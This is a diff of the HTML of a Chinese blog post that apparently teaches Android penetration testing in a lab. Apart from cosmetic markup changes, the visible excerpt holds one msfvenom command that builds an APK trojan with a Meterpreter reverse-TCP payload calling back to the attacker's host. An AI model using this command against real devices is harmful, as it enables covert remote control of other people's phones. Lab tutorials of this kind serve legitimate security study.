@@ -172,7 +172,7 @@
     <div class="post-cover animated fadeIn" style="
             background-image:
             radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-            url(/img/welcome-cover.jpg);">
+            url(/img/welcome.jpg);">
     </div>
     <div class="else">
         <p class="animated fadeInDown">
@@ -187,7 +187,7 @@
                 
                     <span>
                         <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                        2.3k
+                        2.1k
                     </span>
                 
                 
@@ -206,7 +206,7 @@
             
                 <p>Kali:172.16.28.153<br>Android:172.16.28.158</p>
 <a id="more"></a>
-<p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></div></figure></p>
+<p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure></p>
 <p></p>
 <p>然后msfconsole设置监...</p>
             
